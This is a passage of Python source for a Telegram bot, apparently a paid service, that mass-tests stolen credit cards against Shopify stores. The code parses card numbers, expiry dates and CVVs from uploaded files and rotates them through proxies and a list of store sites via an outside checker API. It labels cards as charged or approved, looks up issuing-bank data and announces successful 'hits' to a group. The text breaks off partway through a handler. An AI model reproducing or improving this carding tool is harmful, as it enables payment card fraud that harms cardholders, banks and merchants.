# 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮 - (𝟰𝟬𝗪 - 𝟭𝟬𝟬% 𝘈𝘤𝘤𝘶𝘳𝘢𝘤𝘺 - 𝘡𝘦𝘳𝘰-𝘓𝘢𝘵𝘦𝘯𝘤𝘺 - 𝘜𝘭𝘵𝘳𝘢 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘐)
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon import TelegramClient, events, Button
from telethon.tl.types import ChannelParticipantBanned, DocumentAttributeAnimated
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
from datetime import datetime, timedelta
from urllib.parse import urlparse

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, get_proxy_count, add_proxy_db,
    remove_proxy_by_index, clear_all_proxies, mark_user_joined
)

# ====================== CONFIG ======================
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH', '').strip()
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

client = TelegramClient('shopify_bot', API_ID, API_HASH)
client_instance = client

_admin_env = os.getenv("ADMIN_ID", "8879293808")
try:
    ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
except:
    ADMIN_ID = [8879293808]

_jcid = str(os.getenv("JOIN_CHANNEL_ID", "0")).strip()
try:
    JOIN_CHANNEL_ID = int(_jcid)
except:
    JOIN_CHANNEL_ID = _jcid

_jgid = str(os.getenv("JOIN_GROUP_ID", "0")).strip()
try:
    JOIN_GROUP_ID = int(_jgid)
except:
    JOIN_GROUP_ID = _jgid

_hgid = str(os.getenv("HITS_GROUP_ID", "0")).strip() 
try:
    HITS_GROUP_ID = int(_hgid)
except:
    HITS_GROUP_ID = _hgid

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS = 40  
API_TIMEOUT = 30  
DELAY = 0.5  
HIT_DELAY = 0.1

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 4
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

# ====================== VIP PREMIUM ANIMATED EMOJIS ======================
WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"

VIP_EMOJIS = {
    "charged": "5039644681583985437", 
    "approved": "5039793437776282663",
    "insufficient": "5042176294222037888", 
    "declined": "5042211756541674402", 
    "error": "5042220456184116238",
    "card": "5042101437237036298", 
    "bank": "5042334757040423886", 
    "country_default": "5042186567783809934",
    "time": "5042306247047513767", 
    "price": "5042050649248760772", 
    "gateway": "5042186567783809934", 
    "msg": "5039649904264217620", 
    "total": "5042212959149474775", 
    "speed": "5042187654402122602",
    "user": "5042263334233686301",         
    "vip": "5042101437237036298",          
    "plan_core": "5039644681583985437",    
    "plan_elite": "5039793437776282663",   
    "plan_root": "5042176294222037888",    
    "plan_x": "5042101437237036298"        
}

CUSTOM_COUNTRY_EMOJIS = {
    "US": 0, "GB": 0, "SA": 0, "AE": 0
}

ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif",
    "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif",
    "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif"
]

PLANS = {
    "plan1": {"name": "𝘊𝘰𝘳𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$5.00"},
    "plan2": {"name": "𝘌𝘭𝘪𝘵𝘦 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$10.00"},
    "plan3": {"name": "𝘙𝘰𝘰𝘵 𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$15.00"},
    "plan4": {"name": "𝘟-𝘈𝘤𝘤𝘦𝘴𝘴", "tier": "X", "duration_days": 60, "emoji": "💎", "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}
HIT_BUTTON = [[Button.url("⇾ 𝘖𝘸𝘯𝘦𝘳 ⇽", "https://t.me/Dddadddyttt")]]

# ====================== LOCKS ======================
_MSG_LOCK = None
_EDIT_LOCK = None
_KEYS_LOCK = None

async def get_msg_lock():
    global _MSG_LOCK
    if _MSG_LOCK is None:
        _MSG_LOCK = asyncio.Lock()
    return _MSG_LOCK

async def get_edit_lock():
    global _EDIT_LOCK
    if _EDIT_LOCK is None:
        _EDIT_LOCK = asyncio.Lock()
    return _EDIT_LOCK

async def get_keys_lock():
    global _KEYS_LOCK
    if _KEYS_LOCK is None:
        _KEYS_LOCK = asyncio.Lock()
    return _KEYS_LOCK

# ====================== REDEEM SYSTEM MANAGER ======================
async def load_keys():
    lock = await get_keys_lock()
    async with lock:
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r') as f:
                    content = await f.read()
                    if content:
                        return json.loads(content)
            except Exception:
                return {}
        else:
            try:
                async with aiofiles.open(KEYS_FILE, 'w') as f:
                    await f.write(json.dumps({}))
                return {}
            except Exception:
                return {}
    return {}

async def save_keys(keys_data):
    lock = await get_keys_lock()
    async with lock:
        async with aiofiles.open(KEYS_FILE, 'w') as f:
            await f.write(json.dumps(keys_data, indent=4))

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

# ====================== EMOJIS & GIFS ======================
_GIF_CACHE = {}

def get_custom_emoji(key, fallback=""):
    eid = VIP_EMOJIS.get(key, "")
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>' if eid else fallback

def get_country_emoji(c_code, default_flag):
    eid = CUSTOM_COUNTRY_EMOJIS.get(c_code, 0)
    if eid != 0:
        return f'<tg-emoji emoji-id="{eid}">{default_flag}</tg-emoji>'
    return get_custom_emoji("country_default", default_flag)

async def fetch_gif_to_memory(target_url):
    if target_url in _GIF_CACHE:
        gif_io = io.BytesIO(_GIF_CACHE[target_url])
        gif_io.name = "vip.gif"
        return gif_io

    headers = {"User-Agent": "Mozilla/5.0", "Accept": "image/*,*/*;q=0.8"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url, headers=headers, timeout=5) as response:
                if response.status == 200:
                    data = await response.read()
                    if len(data) > 1024:
                        _GIF_CACHE[target_url] = data
                        gif_io = io.BytesIO(data)
                        gif_io.name = "vip.gif"
                        return gif_io
    except Exception:
        pass
    return None

async def styled_reply(event, text, buttons=None, use_gif=False, specific_gif=None):
    lock = await get_msg_lock()
    async with lock:
        if use_gif or specific_gif:
            for _ in range(3): 
                target_url = specific_gif if specific_gif else random.choice(ANIME_GIFS)
                try:
                    gif_file = await fetch_gif_to_memory(target_url)
                    if gif_file:
                        return await event.client.send_file(event.chat_id, gif_file, caption=text, buttons=buttons, reply_to=event.message.id, parse_mode="html", attributes=[DocumentAttributeAnimated()])
                    else:
                        return await event.client.send_file(event.chat_id, target_url, caption=text, buttons=buttons, reply_to=event.message.id, parse_mode="html")
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds + 1)
                except Exception:
                    await asyncio.sleep(0.5)
            return None
        else:
            try:
                return await event.reply(text, buttons=buttons, parse_mode="html")
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 1)
                return await event.reply(text, buttons=buttons, parse_mode="html")
            except Exception:
                return None

async def styled_send(chat, text, buttons=None, use_gif=False, specific_gif=None):
    lock = await get_msg_lock()
    async with lock:
        if use_gif or specific_gif:
            for _ in range(3): 
                target_url = specific_gif if specific_gif else random.choice(ANIME_GIFS)
                try:
                    gif_file = await fetch_gif_to_memory(target_url)
                    if gif_file:
                        return await client_instance.send_file(chat, gif_file, caption=text, buttons=buttons, parse_mode="html", attributes=[DocumentAttributeAnimated()])
                    else:
                        return await client_instance.send_file(chat, target_url, caption=text, buttons=buttons, parse_mode="html")
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds + 1)
                except Exception:
                    await asyncio.sleep(0.5)
            return None
        else:
            try:
                return await client_instance.send_message(chat, text, buttons=buttons, parse_mode="html")
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 1)
                return await client_instance.send_message(chat, text, buttons=buttons, parse_mode="html")
            except Exception:
                return None

async def styled_edit(msg, text, buttons=None):
    lock = await get_edit_lock()
    async with lock:
        try:
            return await msg.edit(text, buttons=buttons, parse_mode="html")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
            return None 
        except Exception:
            return None

# ====================== SESSIONS & EXTRACTION ======================
_USER_HTTP_SESSIONS = {}

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        # تحديد عدد الاتصالات المتزامنة لمنع طوفان الـ API
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True)
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=15), connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except Exception:
            pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm:
        pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
        u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        ph, pp, pu, ppw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups()
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

def format_proxy_for_api(proxy):
    if not proxy: return ""
    if isinstance(proxy, dict):
        if proxy.get('username') and proxy.get('password'):
            return f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
        return f"{proxy['ip']}:{proxy['port']}"
    if isinstance(proxy, str):
        clean = proxy.strip()
        if "://" in clean:
            try: return urlparse(clean).netloc
            except: return clean
        return clean
    return ""

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
                if r.status == 200:
                    text_data = await r.text()
                    _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in text_data.split('\n') if line.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception:
        pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
        except Exception:
            pass
    return _CACHED_SITES

# ====================== SECURITY FUNCTIONS ======================
_DEAD_INDICATORS = ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error')

def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def check_single_chat(user_id, chat):
    if not chat or str(chat) == "0": return True
    try:
        try:
            chat_var = int(chat)
        except:
            chat_var = chat
        entity = await client_instance.get_entity(chat_var)
        part = await client_instance(GetParticipantRequest(channel=entity, participant=user_id))
        if isinstance(part.participant, ChannelParticipantBanned): return False
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return False

async def is_user_joined(user_id):
    c1 = await check_single_chat(user_id, JOIN_CHANNEL_ID)
    c2 = await check_single_chat(user_id, JOIN_GROUP_ID)
    return c1 and c2

async def is_maintenance(event):
    if _MAINTENANCE_MODE and event.sender_id not in ADMIN_ID:
        msg = f"⦗ {get_custom_emoji('error', '🛠️')} ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦\n\n╰ 𝘛𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘤𝘶𝘳𝘳𝘦𝘯𝘵𝘭𝘺 𝘶𝘯𝘥𝘦𝘳𝘨𝘰𝘪𝘯𝘨 𝘶𝘱𝘨𝘳𝘢𝘥𝘦𝘴.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘵𝘳𝘺 𝘢𝘨𝘢𝘪𝘯 𝘭𝘢𝘵𝘦𝘳."
        if isinstance(event, events.CallbackQuery.Event):
            await event.answer("🛠️ Maintenance Break!", alert=True)
            await styled_edit(event, msg)
        else:
            await styled_reply(event, msg, use_gif=True)
        return True
    return False

async def force_join_check(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return True
    now = time.time()
    USER_LAST_REQ[uid] = now
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    if await is_user_joined(uid):
        _JOIN_CACHE[uid] = now
        return True
    
    kb = []
    if JOIN_CHANNEL_LINK and str(JOIN_CHANNEL_ID) not in ["0", ""]:
        kb.append(Button.url("📢 𝘑𝘰𝘪𝘯 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK))
    if JOIN_GROUP_LINK and str(JOIN_GROUP_ID) not in ["0", ""]:
        kb.append(Button.url("💬 𝘑𝘰𝘪𝘯 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK))
    if not kb: return True
    kb = [kb, [Button.inline("✅ 𝘝𝘦𝘳𝘪𝘧𝘺", b"check_joined")]]
    
    await styled_reply(event, f"⦗ {get_custom_emoji('error', '🛑')} ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘋𝘦𝘯𝘪𝘦𝘥\n\n├ 𝘠𝘰𝘶 𝘮𝘶𝘴𝘵 𝘫𝘰𝘪𝘯 𝘰𝘶𝘳 𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴 𝘧𝘪𝘳𝘴𝘵.\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘫𝘰𝘪𝘯, 𝘵𝘩𝘦𝘯 𝘤𝘭𝘪𝘤𝘬 '𝘝𝘦𝘳𝘪𝘧𝘺'.", buttons=kb, use_gif=True)
    return False

async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    data = await r.json()
                    return {
                        "brand": data.get("brand", "-"), "type": data.get("type", "-"), "level": data.get("level", "-"), "bank": data.get("bank", "-"),
                        "country": data.get("country_name", "-"), "country_code": data.get("country", "-"), "flag": data.get("country_flag", "🏳️")
                    }
    except Exception:
        pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged": header = f"⦗ {get_custom_emoji('charged', '🟢')} ⦘ 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺"
    elif status == "Approved": header = f"⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘝𝘝"
    elif status == "Insufficient": header = f"⦗ {get_custom_emoji('insufficient', '🟡')} ⦘ 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 𝘍𝘶𝘯𝘥𝘴"
    else: header = f"⦗ {get_custom_emoji('declined', '🔴')} ⦘ 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥"
        
    c_code = bi.get('country_code', '')
    country_display = f"{bi.get('country', '-')} {get_country_emoji(c_code, bi.get('flag', '🏳️'))}"
    
    return f"""{header}

⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘊𝘢𝘳𝘥 ⇾ <code>{card}</code>

⦗ {get_custom_emoji('msg', '💬')} ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{response}</code>

⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code>
⦗ {get_custom_emoji('price', '💲')} ⦘ 𝘗𝘳𝘪𝘤𝘦 ⇾ <code>{ps}</code>

⦗ {get_custom_emoji('bank', '🏦')} ⦘ 𝘉𝘢𝘯𝘬 𝘐𝘯𝘧𝘰
 ├ 𝘉𝘢𝘯𝘬: <code>{bi.get('bank', '-')}</code>
 ├ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺: <code>{country_display}</code>
 ├ 𝘉𝘳𝘢𝘯𝘥: <code>{bi.get('brand', '-')}</code>
 ╰ 𝘛𝘺𝘱𝘦: <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>

⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝘛𝘰𝘰𝘬 ⇾ <code>{elapsed:.2f}s</code>"""

# ====================== CHECKER CORE ======================
async def check_card_api(card, site, proxy, session, gateway_name):
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}
        params = {'cc': card, 'site': site}
        fproxy = format_proxy_for_api(proxy)
        if fproxy: params['proxy'] = fproxy
        async with session.get(CHECKER_API_URL, params=params) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try:
                rj = json.loads(text_data)
            except Exception:
                return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            
        response_msg = rj.get('Response', '')
        price = rj.get('Price', '-')
        gate = gateway_name if gateway_name else rj.get('Gate', 'Shopify')
        status = rj.get('Status', '')

        if is_dead_site_error(response_msg): return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = str(response_msg).lower()
        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg or 'thank you' in response_lower or 'payment successful' in response_lower: 
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower: 
            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'insufficient_funds' in response_lower or 'insufficient funds' in response_lower: 
            return {'status': 'Insufficient', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): 
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']): 
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception:
        return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    last_result = None
    available_proxies = list(proxies) if proxies else []
    for attempt in range(max_retries):
        active_sites = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        if not active_sites:
            _SITE_ERRORS_COUNT.clear()
            active_sites = sites
        site = random.choice(active_sites)
        proxy = random.choice(available_proxies) if available_proxies else None
        
        result = await check_card_api(card, site, proxy, session, gateway_name)
        if not result.get('retry'): 
            if result.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']:
                _SITE_ERRORS_COUNT[site] = 0
            return result
        last_result = result
        if attempt < max_retries - 1: await asyncio.sleep(DELAY) 
    
    if last_result:
        return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': last_result.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}

async def _send_global_hit(status, gateway, message, price, uid):
    try:
        if str(HITS_GROUP_ID) in ["0", ""]: return
        try:
            user = await client_instance.get_entity(uid)
            user_name = getattr(user, 'first_name', f"User {uid}")
        except Exception:
            user_name = f"User {uid}"
            
        plan = await get_user_plan(uid)
        plan_name = plan.title() if plan else "Free"
        ps = f"${str(price).replace('$', '')}" if price and str(price) != "-" else ""
        
        if status == "Charged": 
            header = f"⦗ {get_custom_emoji('charged', '🟢')} ⦘ 𝘊𝘏𝘈𝘙𝘎𝘌𝘋 𝘚𝘜𝘊𝘊𝘌𝘚𝘚𝘍𝘜𝘓𝘓𝘠"
        elif status == "Insufficient": 
            header = f"⦗ {get_custom_emoji('insufficient', '🟡')} ⦘ 𝘐𝘕𝘚𝘜𝘍𝘍𝘐𝘊𝘐𝘌𝘕𝘛 𝘍𝘜𝘕𝘋𝘚"
        else:
            return 
        
        text = f"""{header}

├ ⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gateway}</code> {ps}
├ ⦗ {get_custom_emoji('msg', '💬')} ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{message}</code>
╰ ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘜𝘴𝘦𝘳 ⇾ <a href="tg://user?id={uid}">{user_name}</a> (<code>{plan_name}</code>)"""

        await client_instance.send_message(HITS_GROUP_ID, text, parse_mode="html", link_preview=False)
    except Exception:
        pass

# ====================== COMMANDS / USER HANDLERS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    if await is_maintenance(event): return
    try:
        if not await force_join_check(event): return
        await ensure_user(event.sender_id)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        
        account_prefix = "├" if event.sender_id in ADMIN_ID else "╰"
        admin_panel = ""
        if event.sender_id in ADMIN_ID:
            admin_panel = f"\n\n╰ ⦗ {get_custom_emoji('vip', '👑')} ⦘ 𝘈𝘥𝘮𝘪𝘯 𝘗𝘢𝘯𝘦𝘭\n  ├ /gen [𝘱𝘭𝘢𝘯] [𝘲𝘵𝘺] ⇾ 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦 𝘒𝘦𝘺𝘴\n  ├ /validate [𝘬𝘦𝘺] ⇾ 𝘊𝘩𝘦𝘤𝘬 𝘒𝘦𝘺\n  ├ /users ⇾ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘚𝘵𝘢𝘵𝘶𝘴\n  ╰ /maint ⇾ 𝘔𝘢𝘪𝘯𝘵𝘦𝘯𝘢𝘯𝘤𝘦 𝘔𝘰𝘥𝘦"

        text = f"""⦗ {get_custom_emoji('speed', '⚡')} ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮

├ ⦗ {get_custom_emoji('card', '💳')} ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
│ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬

├ ⦗ {get_custom_emoji('bank', '⚙️')} ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘔𝘢𝘯𝘢𝘨𝘦𝘳
│ ├ /addpxy ⇾ 𝘈𝘥𝘥 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ├ /proxy ⇾ 𝘝𝘪𝘦𝘸 𝘗𝘳𝘰𝘹𝘪𝘦𝘴
│ ╰ /rmpxy ⇾ 𝘙𝘦𝘮𝘰𝘷𝘦 𝘗𝘳𝘰𝘹𝘪𝘦𝘴

{account_prefix} ⦗ {get_custom_emoji('user', '👤')} ⦘ 𝘈𝘤𝘤𝘰𝘶𝘯𝘵
  ├ /info ⇾ 𝘠𝘰𝘶𝘳 𝘗𝘳𝘰𝘧𝘪𝘭𝘦
  ├ /redeem ⇾ 𝘙𝘦𝘥𝘦𝘦𝘮 𝘒𝘦𝘺
  ├ /fb ⇾ 𝘚𝘦𝘯𝘥 𝘍𝘦𝘦𝘥𝘣𝘢𝘤𝘬
  ╰ /plan ⇾ 𝘝𝘪𝘦𝘸 𝘚𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯𝘴{admin_panel}

⦗ {get_custom_emoji('vip', '💎')} ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
        kb = [[Button.inline("⦗ 💎 ⦘ 𝘝𝘪𝘦𝘸 𝘗𝘭𝘢𝘯𝘴", b"show_plans")], [Button.url("⦗ 📢 ⦘ 𝘊𝘩𝘢𝘯𝘯𝘦𝘭", JOIN_CHANNEL_LINK), Button.url("⦗ 💬 ⦘ 𝘎𝘳𝘰𝘶𝘱", JOIN_GROUP_LINK)]]
        await styled_reply(event, text, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    except Exception as e:
        await event.reply(f"⚠️ Error: {e}")

@client.on(events.CallbackQuery(data=b"back_start"))
async def back_start_cb(event):
    if await is_maintenance(event): return
    uid = event.sender_id
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    account_prefix = "├" if uid in ADMIN_ID else "╰"
    admin_panel = ""
    if uid in ADMIN_ID:
